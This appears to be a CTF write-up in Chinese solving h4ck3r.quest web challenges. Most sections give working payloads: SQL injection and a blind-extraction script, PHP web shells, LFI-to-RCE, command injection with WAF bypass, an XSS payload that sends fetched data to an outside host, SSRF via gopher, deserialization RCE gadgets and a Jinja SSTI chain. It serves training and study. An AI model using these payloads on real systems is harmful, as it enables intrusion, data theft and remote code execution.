# h4ck3r.quest

## gitleak
由題目可知，與 git leak 有關

測試發現路徑 `.git/config` 存在
使用 scrabble 工具進行萃取，獲得原始碼

FLAG{gitleak_is_fun}

## .DS_Store
由題目可知與 `.DS_Store` 有關

在 `.DS_Store` 路徑下確實看到以下資訊
```
s u p e r _ s e c r e t _ m e o w m e o w . p h p
```

進入後得到 flag

FLAG{.DS_Store is so annoying lmao}

## Log me in
account: `' or 1=1) -- #`

FLAG{b4by_sql_inj3cti0n}

## Log me in: Revenge
### 解法 1
account: `') union select 'admin','pass' -- #`
password: `pass`

FLAG{un10n_bas3d_sqli}

### 解法 2

error based 掃描

```python=
import requests
url = "http://h4ck3r.quest:8201/login"

# chr = [chr(ord('a')+x) for x in range(26)] + [chr(ord('A')+x) for x in range(26)] + [chr(ord('0')+x) for x in range(10)] + ['_', '-', '.', '/', '!', ' ', '*', '(', ')', '+', '=', '&', '^', '{', '}', '[', ']', '@', '"', "'", '#', '$', '%']

total_str = ""

for i in range(1, 44):
    front = 0
    end = 127
    while(front < end):
        mid = (front + end) // 2
        j = chr(mid)
        payload = f"adn') union select null, null from admin where (username='admin' and 1/(substr(password,{i},1)>\"{j}\") and '1'='1"
        myobj = {'username': payload, 'password': 'xx'}
        x = requests.post(url, data = myobj)
        if(x.status_code == 200):
            front = mid + 1
        else:
            payload = f"adn') union select null, null from admin where (username='admin' and 1/(substr(password,{i},1)=\"{j}\") and '1'='1"
            myobj = {'username': payload, 'password': 'xx'}
            x = requests.post(url, data = myobj)
            if(x.status_code == 200):
                front = mid
                break
            else:
                end = mid-1
    print(i, chr(front))
    total_str += chr(front)
    if(front >= 128 or front < 0):
        print(f" No symble at {i}")


print("\n\n", total_str)
```

掃出來的 password: `hOTwBz4wf-fmiHBEKU6NXq-WmKOk8dyv_wchROLIzJM`

再登入即可

FLAG{un10n_bas3d_sqli}

## Image Space 0x01
meow.php
```php=
<?php system($_GET['meow']);?>
```

FLAG{upl0ad_t0_pwn!!!}

## Image Space 0x02
meow.png.php

前面亂碼的部分是 png 的 file signature
```php=
NG

<?php system($_GET['meow']);?>
```

FLAG{ext3ns10n_ch3ck_f4il3d}

## Image Space 0x03

檔案同 0x02

在上傳時 `--boundry--` 之間的 content-type 改成 `image/png`

FLAG{byp4ss_all_th3_things}

## HakkaMD
### 解法 1
先查看 phpinfo 中有關 session 的儲存位置及名稱，這題儲存位置是在 `/tmp` 下，名稱是 `PHPSESSID`

讀取 `/tmp/sess_<當前session>`，可發現儲存的是筆記的內容

新增筆記，內容為 `<?php system($_GET['meow']); ?>`

讀取 `/tmp/sess_<當前session>` 並帶上參數 `meow=ls -al /`，即可進行 RCE

FLAG{include(LFI_to_RCE)}

### 解法 2
讀取 `/proc/1/mountinfo` 檔案，發現 flag mount point
讀取 `/flag_aff6136bbef82137`
FLAG{include(LFI_to_RCE)}

## My First Meow Website
使用 php 偽協議
`http://h4ck3r.quest:8400/?page=php://filter/convert.base64-encode/resource=admin`

進行 base64 decode 後，發現帳號密碼資訊
`admin / kqqPFObwxU8HYo8E5QgNLhdOxvZmtPhyBCyDxCwpvAQ`
登入拿 flag

FLAG{ezzzz_lfi}

## DNS Lookup Tool
payload: `';cat /flag_44ebd3936a907d59; #`

FLAG{B4by_c0mmand_1njection!}

## DNS Lookup Tool 🔍 | WAF
先 try wildcard: `'"`ls /fla*`" #`

拿到 flag 名稱，取得檔案內容: `'"`cat /fla''g_f4b9830a65d9e956`" #`

FLAG{Y0U_$(Byp4ssed)_th3_`waf`}

## XSS Me
欲塞入 payload:
```javascript!
</script><script> fetch('http://h4ck3r.quest:8800/getflag').then(r=>r.text()).then(x=>new Image().src='http://lab.feifei.tw/hijacking.php?data='%2bx) </script>
```

需要將一些字元用 url encoding 處理
```!
http://h4ck3r.quest:8800/?type=error&message=%3C/script%3E%3Cscript%3E%20fetch(%27http://h4ck3r.quest:8800/getflag%27).then(r=%3Er.text()).then(x=%3Enew%20Image().src=%27http://lab.feifei.tw/hijacking.php?data=%27%2bx)%20%3C/script%3E
```

FLAG{b4by_xss_h4ck3r}

## Web Preview Card
使用 gopher 協定
```!
gopher://localhost:80/_POST%20/flag.php%20HTTP/1.0%0D%0AHost:%20localhost:80%0D%0AContent-Length:%2014%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Agivemeflag=yes
```

FLAG{gopher://http_post}

## SSRFrog
在原始碼中看到要填入的網址

使用工具: https://splitline.github.io/domain-obfuscator/
payload: `hTtp:\/Ⓣℋᵉ．ⅽ⁰Ⓞ０o⓪Ⓛ-ﬂ㊹④Ｇ｡ₛℯℜｖⒺＲ.㏌ⓣᴱℝ㎁ℒ`

flag{C0o0o0oL_baby_ssrf_trick}

## Debug
payload: `http://localhost/debug?a=https://`

FLAG{intro2ssrf}

## Pickle
使用以下 code，得知 flag 檔案名稱
```python=
class A:
    def __reduce__(self): return (__import__('subprocess').check_output, (['ls', '-al', '/'],))

base64.b64encode(pickle.dumps({"name": A(), "age":1}))
```

讀取檔案
```python=
class B:
    def __reduce__(self): return (__import__('subprocess').check_output, (['cat', '/flag_5fb2acebf1d0c558'],))

base64.b64encode(pickle.dumps({"name": B(), "age":1}))
```

FLAG{p1ckle_r1ck}

## Baby Cat
使用以下 code，得知 flag 檔案名稱
```php=
class Cat {public $name="'; ls -al /; #";}
base64_encode(serialize(new Cat()))
```

讀取檔案
```php=
class Cat {public $name="'; cat /flag_5fb2acebf1d0c558; #";}
base64_encode(serialize(new Cat()))
```

FLAG{d3serializable_c4t}

## Magic Cat
```php=
class Caster{public $cast_func='system';}
class Cat{public $magic; public $spell; function __construct($spell){$this->magic=new Caster(); $this->spell=$spell;}}

# 得知 flag 檔案名稱
base64_encode(serialize(new Cat("ls -al /")))

# 讀取檔案
base64_encode(serialize(new Cat("cat /flag_23907376917516c8")))
```

FLAG{magic_cat_pwnpwn}

## Jinja
得知 flag 檔案名稱
```python!
{{ "".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('ls -al /').read() }}
```

讀取檔案
```python!
{{ "".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cat /th1s_15_fl4ggggggg').read() }}
```

FLAG{ssti.__class__.__pwn__}

###### tags: `CTF`